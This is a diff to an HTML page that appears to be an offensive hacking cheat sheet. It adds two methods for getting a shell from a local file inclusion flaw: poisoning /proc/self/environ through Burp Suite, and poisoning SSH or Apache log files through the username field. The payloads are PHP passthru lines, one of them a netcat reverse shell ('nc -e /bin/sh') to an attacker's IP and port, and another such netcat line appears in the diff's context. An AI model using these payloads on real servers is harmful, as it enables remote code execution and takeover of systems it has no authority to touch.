@@ -177,10 +177,16 @@ nc -e /bin/sh 10.20.14 8080<br>
      <h4>Tips: some time it only work on url. it also some time word on specified folder. find it and execute payload there.</h4>
     
     <h3>Getting shell from LFI exploit</h3>
-    <p><b>Method 1</b>
-    <ol> </ol>
-    <b>Method 2</b>
-    <ol> </ol>
+    <p><b>Method 1: </b>
+    <ol>Target >> /proc/self/environ<br>
+     execute /proc/self/environ . read the file and chose an environ variable. then change it value with payload and forward it through burf suite. 
+     <br> PHP payload >> <pre>  &lt;?passthru("nc -e /bin/sh [ip] [port]");?&gt;</pre></ol>
+    <b>Method 2: </b>
+    <ol>
+    <br>Target >> /var/log/auth.log  or  /var/log/apache2/access.log<br>
+    <p>try to connect with ssh. where payload use on username.<br>
+    this time payload would encrypted like <pre> "&lt;?passthru(base64_decode('encrypted code'));?&gt;"</pre>
+    </ol>
 
 </div>
    <!-- Exploitation section end here termux -->
